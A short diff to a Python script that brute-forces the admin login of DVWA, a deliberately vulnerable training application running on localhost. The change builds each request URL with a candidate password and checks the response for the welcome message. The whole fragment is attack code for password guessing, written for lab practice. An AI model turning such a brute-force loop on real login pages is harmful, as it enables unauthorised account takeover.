@@ -20,7 +20,8 @@ def bruteforce():
                 "Login": "Login",
                 "user_token": "c1368edf766970c4532d39bccd92513d"
             }
-            response = requests.get("http://localhost/DVWA/vulnerabilities/brute/", params=param)
+            url_1 = f'http://localhost/DVWA/vulnerabilities/brute/?username=admin&password={password}&user_token=TOKEN&Login=Login'
+            response = requests.get(url_1, params=param)
             soup = Soup(response.content, features="lxml")
             #print(soup)
             is_success = soup.find(string="Welcome to the password protected area admin")
